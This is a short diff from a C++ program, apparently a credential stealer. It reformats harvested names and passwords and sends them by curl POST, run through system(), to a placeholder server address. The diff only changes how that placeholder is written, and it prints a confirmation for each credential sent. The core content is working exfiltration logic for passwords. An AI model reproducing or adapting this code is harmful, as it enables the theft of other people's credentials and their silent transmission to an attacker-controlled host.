@@ -52,7 +52,7 @@ int main() {
 				password = password.substr(13, password.length());
 				replace(password.begin(), password.end(), ' ', ';');
 
-				string sendCommand = "C:\\Windows\\System32\\curl.exe -X POST \"<SERVER ADDRESS>/?name=" + name + "&password=" + password + "\"";
+				string sendCommand = "C:\\Windows\\System32\\curl.exe -X POST \"SERVER ADDRESS/?name=" + name + "&password=" + password + "\"";
 				system(sendCommand.c_str());
 				cout << " - sent: " << name << endl;
 			}
